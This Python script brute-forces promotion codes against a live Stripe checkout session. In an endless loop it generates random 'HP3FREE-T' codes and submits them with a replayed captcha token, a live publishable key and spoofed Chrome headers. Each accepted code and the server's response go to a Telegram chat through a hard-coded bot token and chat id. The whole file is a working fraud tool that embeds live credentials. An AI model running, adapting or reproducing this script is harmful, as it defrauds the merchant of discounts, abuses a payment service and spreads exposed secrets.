import requests
import random
import string
import telebot
####bot spam ###
tok = "8128789997:AAHIE70sQCwEZYPt7p90uLLg5RUHrIYnyxU"
ch_id = "7037898496"
botA = telebot.TeleBot(token=tok)
def test():
	fixed_part = "HP3FREE-T"
	chars = string.ascii_uppercase + string.digits
	
	z = (
	    fixed_part +
	    random.choice(chars) +
	    random.choice(chars) +
	    "B" +
	    random.choice(chars)
	)
	print(z)
	url = "https://api.stripe.com/v1/payment_pages/cs_live_b1CMuIlrwitah2OPoF6vH8APzZNzG4LTwd6lPmJzVUVqEAl6QKpoPBTI6T"
	
	payload = {
	  'eid': "NA",
	  'promotion_code': z,
	  'passive_captcha_token': "P1_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwZCI6MCwiZXhwIjoxNzg2NzQxMjU5LCJjZGF0YSI6ImpSeVRsNlJ2eUxOWUtMR3gyQkFMRytxYTVvU1NyR1dtUWJ6cEpDTmNkaWNoTUZGZnAzVVVibG0yUWo3NEdtMHRFMlRWZXJ6RCtFMUlOM0laNjhXdFMrcHM5d1NtSEJyU2VJR0VjRE5pLy9RN2VtL2ZSNXV5VWszMERCS1lHUkNieG92WnRMT2Y2WlBWTmlQWkxWREFWYjZyWUVSWmx5blNnR0ZOTjlMd3l2RzNnaVZCcXQwQ3dGbFFsTUtTUjdUTkJTcUJSQnliU2JQckhjWkI5emI0MEJIY1QrVjlzSkQ3UWtFVG5ZZ2lEbVhtWnVYZVZXQ1BrUzJvY0szaVNSTHdRbXdOUTZUd2owZ042bUx5UHJQRHVhZFJuNXBvRjBnK0xObEtSdmM3SjR6WHlnaUtPQ1lqeTNzQklHQmphMEV5d3NhV205aVY1Y3plRSt1YUdmUWRyR1JCWU1ZOGsyZzZRQU50amxUdDRQODdhRXVNeTlvcjl3aTRMZjNYS2NpbVA5T3JCTHYydWlQYkJOOGtMeFd0WHhNTGpxSnRveFZDTTZKYmk0aVZuOVhoTlEzbGFXNSs5MTBjRk9RUTZtSkw5SDh6dHNXR01OZjkiLCJwYXNza2V5IjoiTkZ0d1IwZG5LcmJveVFVcGpmSFZjd013cWgyODVQdHVKalpoU1paeDVobis0Wm9tL0xxMlZMYzlDQmpqNnRaQmZaZ2ZrS2M3T3JyUnJVRFY1eHVjd2t5emdndmV6bVBFK1pMU1pmU0ErdXhHV1oxWHZ1ZlA3a1ZwOWtqSTZqaDBrYjgzQ1lxbDVTSzRYRVdaUi94eXhjTE5vSGhGbVk1TTVBSSs0aitMUmZ3MXpseExlZGxpMFM0bkZpYlE4MFFoandxQVptWWh6RTBwMC9ObUJpQVJnSERGelVVNUQ0ZVJTbE9EU3R0d0xCN1BPdVQxcDZmem5tSXV5S1hSNTZxU0VyR090Sk1tM3dGM0l5UGdLVkhOR0RBNnZlV1VGU0FnWkVoMlM3MkdVVDc5aDNxdDRHWTBNZWZpL1JzWnZCRGtCM25OQ05wdFhxeUVKMmk4ZFFISTg2dWtXU0JNOVU1SVBzODQwcTRsUjNjQmY1VFd0RmJFbkl1cm9tV1RIeTh4em1ldVVDVEdoK3ArRFlEZEdEY3pOMjhrSHJISWs5RzNjZm0rK1BUUnJCWDdNSnNrcDE0R1cxWStkeTV3NUFsb2M5RktMZDRMN2FQamxtcmplYmNZanVKZGV2dC9WV3ZYVzhpODRKWU9JNlMxN0M2ek9zSFlocEsrZXZzSzB6MUlsUkxuaHdDQm5QWnU5OG9LRTZTZmhXbFN1OXlBS0VJQW1ueDg4bFVKc3FYM25JZmNHMmhaK3VyVzM2aC85cXFtT2hNY3lXK2JldVRmdmQ0QTdsSVVKYjI0YS95OVRtSXNXQzAzTTkrR3ZCbjNpTWJaUHg5ZHc5SDdDV2lzMmJTQ09oZ1Y0QXA3dk1DZVMwMUJReFRWdVdoQW9KcGIrRHBIVkpBam81REt6RXF0Sk9zTCtaNUlINEE5RHA0WWlIM0VTLzFLMk16Nks4eDNVWThQUjh5VmVLZnpWVjNFMDhpeWdTV2tuMk8xb1E1YTBFOG9zcHN2UlVvTngxaitOeGFTbU9Wc0dkTHhEQ3dRZjRydmNGcWYxUjg1UDgyaEhIQ0txS1BGZTE3Ui9QcTNucUpyaXVjYUJLSlZGQWg3UGtYM3VVU3lQRUJZWmwyeTY0WFZJUWUyNjdYMENKZzRadDJNd1l3Nmx4WFQxWmMwUjI1emRhbXlUNjRtdDdkeHkxemVYL0RMUDdWTFZiVFc2T25NZk1VSUw2NmtDRHdteHI1Y1RzRDdsYlJiRUtPUk9YTWdZYVY1L3YwOGVnbEZEZC9xaGszNVZlck9Cc2JxOXRQVVR3R1lGRk1ZaWplcE04YitxRWhoekEzT3dmV1FLTVhqZHdiVEgxZURmVU5IeERQQUk5N0g5ZWFEeHUrcFd4SysxeEUwalZuSGdmV24vVEUyVTBMd2dKWlQyN0ZLWkZtNkRvSzdwbmVjMnRGYkU2K3NtSTRPR0lTOEZOclh6RER4QytSL3l3UE1MRTNLallhaEtoTlFMeERSTTZKQU5BSDNkdVA4YklwSXorQWViZGVtci9LaVFzblR1WkZJVUJJaUdmV0NOTHU0bXFQbFBESGRQTm5EMGQwbGg0eXRoYWJGU3k5czg1ZFJ1eWZnTVh4cTdBT2h3Ni92NW1BL1NaLzJPVFlPK2x1blVWMzQ4WlJqaG1mMzdzd1JvVG5iRGFzWnl2MisrS3FBOEVnWno4VkY5c2pLWXAyVjhZNkM0QUNlUDVvc2IrQUdtMjNseTJ2SFBGVHdSdWtMTG40ZXE5NVp2Ujh4ZUNrUWxXbGtpYVR1U2tVZjBDdTZXM0ZCUkgwVGRjcW9haTJVNnBYWFJKTFlRYTJlOFZkQjh6UEc0M3V3cmk5V2lBZ0IvTEZSY0kzMTA5TFBVUlVya3hSaVNUcmZQN1VRUytaY3Mrb3U2M0RlVFlid3BqWEZUN1VNaWFOQzlkRDM1QnZrdy9hQUZ0Z3R2LzRuSkhyeHdkVGVHZWlhM2ZJeGwvTm1mVlpCc3E4aldVYnl5UGYwU01CYnZFcFFxYTRjZnFONjdPOUNGWmhVak5zczhreW9aaXB1OGEzN0RXWVBzZmJIY3ZiU2dtN0lkeGozVStqVWNwQXBSeWwwL3ZSTHQwRitQd2txc1MxYUlNTS9oVy9ldkVEc0wrYUpBY3NvZ0hWWFczWHp3OTRTdk1mYWU3OEhxVWdaWUo3WjBTOVN1d3VlMnF2NWpPYlZoRURGUG5HUU9tNk9RTEdxTU96Sm44VElVelVBTUV5RUVlZjlzOHJneWZFQnpJQ3poRmhVa1g2WWJQK081RXJlNnU3MFQrb215dXNheXQwY3B2MHREUysxemZJblRJb3J3eGlGRHgzTGx1aldkS0ljbjU2UGF4M2FvR2ZGK1ZtUE02VURUcFZvSytsM2tZcVNKUTVpTURxS2JBQUNVNU81c2YyZnRsb0E0TCs2SktCZ3k2enhka2VWNmFNQzZJYkhGUGpLTlJzMGRSMlpuMmVOeWg3Q3lnR1BDcUdSRmlJR0JEdlQ5TEVIL3gycjdMVWQ5WEcrQVhRUHhPYm51M0xuWDFHbFJQanZ5ZzZldTFuSzdjVXBqUzZqcEJJaThiMWJONFN5cU16V0wyT05WT0o2dHFUeDhseTZGMVk0WmJXSFR4cGNvcEFncEVHdnRzMVh4T3BvOVE3RUlFaVJWV3VBeFJ1ZEpQd0NzZlIxUFd3UEF4RGlwbTdOM1lsTUVQaDErTUJMc2EyUDF2UmlWY2dHTHhmZWkyVmZLWVZBRjlVQ3prWDdLMnBScGMrNTZRbU5wWDJtKzEzOFVUWVlRNDZZbHlwbVpJUGpUL1g0TTN1TjRMQ0Jsa2hTTythYWlaeVVid1NWR0l4cFRLSTNsRDdzMlM0WXJBQ0RRZmJHV0VOMThrLzZsSHlZZTQyQ2NKRURRN2RXekorZWRZWUpEZz09Iiwia3IiOiI0OTc5ZGI4NiIsInNoYXJkX2lkIjo1MzU3NjU1OX0.4VUHy2dnZFJs71zKvUwzovCL8sglq9b5x5ZYsqdpS-Q",
	  'passive_captcha_ekey': "",
	  'key': "pk_live_51LNh3DDIvHNr5wfC3AK3lD9Smr5Xt4cbIkIDA0pFcBSsS09PB7bdaH7l2y6JZJGIFshg4moyOEPvZhbmYg6hFrJ800uSwwp8oJ"
	}
	#print(payload["promotion_code"])
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
	  'Accept': "application/json",
	  'Accept-Encoding': "gzip, deflate, br, zstd",
	  'sec-ch-ua-platform': "\"Linux\"",
	  'sec-ch-ua': "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
	  'sec-ch-ua-mobile': "?0",
	  'origin': "https://checkout.stripe.com",
	  'sec-fetch-site': "same-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://checkout.stripe.com/",
	  'accept-language': "ar,en;q=0.9,de;q=0.8",
	  'priority': "u=1, i"
	}
	
	response = requests.post(url, data=payload, headers=headers).text
	if "This promotion code is invalid." in response:
		print("Bad")
	else:
		botA.send_message(chat_id=ch_id, text=z)
		botA.send_message(chat_id=ch_id, text=response)		
while True:
	try:
		test()
	except:pass
